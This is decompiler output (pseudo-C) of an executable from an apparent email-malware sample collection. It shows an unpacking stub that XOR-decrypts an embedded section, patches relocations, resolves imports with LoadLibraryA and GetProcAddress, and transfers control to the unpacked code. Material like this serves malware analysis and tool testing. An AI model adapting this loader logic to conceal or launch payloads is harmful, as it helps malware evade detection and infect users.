// subject.c
// Generated on 5/4/2015 12:22:58 AM by decompiling malware_via_email/malware_0100/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 ecx, word32 edx, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 eax_30 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 esi_15 = 0x00000000
	word32 ebx_287 = eax_30 + 0x00000023
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040102D
l0040102A:
	ebx_287 = eax_30 + 0x00000001
l0040102D:
	Mem47[fp - 0x0000001C:word32] = 0x00000059
	CloseHandle(0xFFFFFFFF)
	Mem52[fp - 0x0000001C:word32] = fp - 0x00000008
	Mem54[fp - 0x00000020:word32] = 0x00000040
	Mem56[fp - 0x00000024:word32] = 0x00003000
	Mem58[fp - 0x00000028:word32] = 0x00401000
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_63 = 0x00000000
l00401051:
	branch esi_15 != ebx_287 l0040105A
l00401058:
	esi_15 = 0x00000000
l0040105A:
	byte v15_85 = Mem58[eax_63 + 0x004011C0:byte] ^ Mem58[esi_15 + 0x00404000:byte]
	Mem86[eax_63 + 0x004011C0:byte] = v15_85
	eax_63 = eax_63 + 0x00000001
	esi_15 = esi_15 + 0x00000001
	branch eax_63 <u 0x00001420 l00401051
l00401079:
	word32 edi_107 = 0x004024A0
	word32 dwLoc04_100 = 0x00000000
l00401094:
	word32 eax_109 = Mem86[edi_107 + 0x00000004:word32]
	word32 esi_116 = edi_107 + 0x00000008
	branch eax_109 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010E1
l004010A6:
	word32 ebp_255 = eax_109 - 0x00000008 >>u 0x00000001
l004010B0:
	branch (Mem86[esi_116 + 0x00000000:word16] & 0xF000) != 0x3000 l004010D9
l004010C2:
	word32 eax_277 = ((word32) Mem86[esi_116 + 0x00000000:word16] & 0x00000FFF) + Mem86[edi_107 + 0x00000000:word32]
	Mem282[eax_277 + 0x00400F40:word32] = Mem86[eax_277 + 0x00400F40:word32] + 0xF0400F40
l004010D9:
	esi_116 = esi_116 + 0x00000002
	ebp_255 = ebp_255 - 0x00000001
	branch ebp_255 != 0x00000000 l004010B0
l004010E1:
	word32 eax_123 = Mem86[edi_107 + 0x00000004:word32]
	word32 ecx_125 = dwLoc04_100 + eax_123
	word32 edi_126 = edi_107 + eax_123
	branch ecx_125 <u 0x000000E4 l00401094
	word32 eax_130 = Mem86[edi_126 + 0x00000004:word32]
	word32 ecx_132 = ecx_125 + eax_130
	edi_107 = edi_126 + eax_130
	dwLoc04_100 = ecx_132
	branch ecx_132 <u 0x000000E4 l00401094
l004010F8:
	branch Mem86[0x00401CAC:word32] == 0x00000000 l00401179
	word32 edi_143 = 0x00401C9C
	word32 dwLoc04_144 = 0x00401C9C
	branch Mem86[0x00401CAC:word32] == 0x00000000 l00401179
l0040110B:
	edi_170 = edi_143
l00401110:
	word32 edi_170
	word32 eax_176 = LoadLibraryA(Mem86[edi_170 + 0x0000000C:word32] + 0x00400F40)
	branch eax_176 == 0x00000000 l0040116C
l00401122:
	word32 edi_203
	word32 eax_198 = Mem86[edi_170 + 0x00000000:word32]
	branch eax_198 == 0x00000000 l0040112C
l00401128:
	edi_203 = eax_198
	goto l0040112F
l0040112C:
	edi_203 = Mem86[edi_170 + 0x00000010:word32]
l0040112F:
	word32 edi_206 = edi_203 + 0x00400F40
	word32 esi_207 = Mem86[dwLoc04_144 + 0x00000010:word32] + 0x00400F40
	branch Mem86[edi_206 + 0x00000000:word32] == 0x00000000 l00401168
l0040113F:
l00401140:
	word32 dwLoc1C_237
	word32 eax_231 = Mem86[edi_206 + 0x00000000:word32]
	word16 ax_232 = (word16) eax_231
	branch eax_231 >= 0x00000000 l0040114F
l00401149:
	dwLoc1C_237 = (word32) ax_232
	goto l00401154
l0040114F:
	dwLoc1C_237 = eax_231 + 0x00400F42
l00401154:
	Mem242[esi_207 + 0x00000000:word32] = GetProcAddress(eax_176, dwLoc1C_237)
	edi_206 = edi_206 + 0x00000004
	esi_207 = esi_207 + 0x00000004
	branch Mem242[edi_206 + 0x00000000:word32] != 0x00000000 l00401140
l00401168:
	edi_170 = dwLoc04_144
l0040116C:
	edi_170 = edi_170 + 0x00000014
	dwLoc04_144 = edi_170
	branch Mem86[edi_170 + 0x00000010:word32] != 0x00000000 l00401110
l00401179:
	call 0x00401990 (retsize: 4; depth: 28)
	ExitProcess(0x00000000)
fn00401000_exit:
}

